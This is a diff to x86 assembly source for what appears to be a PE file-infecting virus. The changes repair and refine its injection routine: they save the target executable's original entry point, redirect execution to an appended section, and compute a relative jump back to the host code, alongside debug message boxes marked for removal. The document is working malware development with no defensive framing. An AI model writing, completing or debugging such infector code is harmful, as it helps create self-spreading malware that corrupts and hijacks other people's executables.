@@ -192,14 +192,6 @@ mov	[DELTA HandleSearch], eax
 
 ; INJECT THE NEXT !
 nextFileToInject:
-; DEBUG FILE TO INJECT - TODO REMOVE
-push	0
-push	0
-PDELTA	FileData.cFileName
-push	0
-call	[DELTA pMessageBox]
-
-
 ; OPEN FILE
 push	0
 push	0
@@ -387,7 +379,8 @@ mov	eax, [DELTA PeNtHeader]
 add	eax, 01Ch
 ; CHANGE ENTRY POINT
 add	eax, 0Ch
-mov	[DELTA OldEntryPoint], eax
+mov	edi, [eax]
+mov	[DELTA OldEntryPoint], edi
 mov	[eax], esi
 ; CHANGE SIZE OF IMAGE
 xor	edi, edi
@@ -451,14 +444,20 @@ loop	createNewSection
 mov	edi, errorExit - toInject ; Offset jmp
 add	edi, [DELTA PeFileMap] ; Add base filemap
 add	edi, [DELTA PointerToRawData] ; Add section offset
-mov	byte ptr [edi], 0EAh ; Jmp far OPCODE
-mov	eax, [DELTA OldEntryPoint]
-mov	dword ptr [edi], eax ; Jmp address
+add	edi, 11
+mov	eax, 0E9h ; Push imm32 OPCODE
+stosb
+mov	eax, [DELTA OldEntryPoint] ; Entry point address
+sub	eax, [DELTA VirtualAddress]
+mov	edx, errorExit - toInject
+sub	eax, edx
+sub	eax, 010h
+stosd
 
 ; DEBUG FILE INJECTED - TODO REMOVE
 push	0
-push	0
 PDELTA	DebugDone
+PDELTA	FileData.cFileName
 push	0
 call	[DELTA pMessageBox]
 
@@ -487,6 +486,16 @@ jmp	nextFileToInject
 
 ; Jump to old entry point (Overrided when injecting)
 errorExit:
+mov	eax, 042h
+mov	eax, 042h
+mov	eax, 042h
+mov	eax, 042h
+mov	eax, 042h
+mov	eax, 042h
+mov	eax, 042h
+mov	eax, 042h
+mov	eax, 042h
+mov	eax, 042h
 push	0
 call 	[DELTA pExitProcess]
 
